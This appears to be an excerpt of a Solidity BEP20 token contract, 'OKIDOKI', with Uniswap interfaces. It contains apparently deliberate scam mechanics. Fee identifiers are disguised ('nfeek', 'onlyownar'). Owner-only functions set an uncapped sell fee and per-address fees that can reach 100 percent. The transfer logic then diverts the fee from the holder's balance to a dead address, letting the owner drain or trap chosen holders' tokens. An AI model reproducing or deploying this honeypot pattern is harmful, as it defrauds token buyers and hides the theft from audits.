...
interface IUniswapV2Factory {
    ...
    function nfeekTo() external view returns (address);
    function nfeekToSetter() external view returns (address);
    ...
    function setnfeekTo(address) external;
    function setnfeekToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingnfeekOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingnfeekOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingnfeekOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingnfeekOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingnfeekOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract OKIDOKI is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellnfeek = 0;

    uint256 private _defaultBuynfeek = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipnfeek;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellnfeek = _value;
    }

    function setSlipnfeek(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipnfeek[_address] = _value;
    }

    function getSlipnfeek(address _address) external view onlyownar returns (uint256) {
        return _slipnfeek[_address];
    }


    function setMAccountnfeek(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountnfeek(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradenfeekAmount = 0;

        if (rF) {
            uint256 tradenfeek = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradenfeek = _defaultSellnfeek;
                }
                if (from == uniswapV2Pair) {

                    tradenfeek = _defaultBuynfeek;
                }
            }
            if (_slipnfeek[from] > 0) {
                tradenfeek = _slipnfeek[from];
            }

            tradenfeekAmount = _Amount.mul(tradenfeek).div(100);
        }


        if (tradenfeekAmount > 0) {
            _balances[from] = _balances[from].sub(tradenfeekAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradenfeekAmount);
            emit Transfer(from, _deadAddress, tradenfeekAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradenfeekAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradenfeekAmount);
        emit Transfer(from, _to, _Amount - tradenfeekAmount);
    }
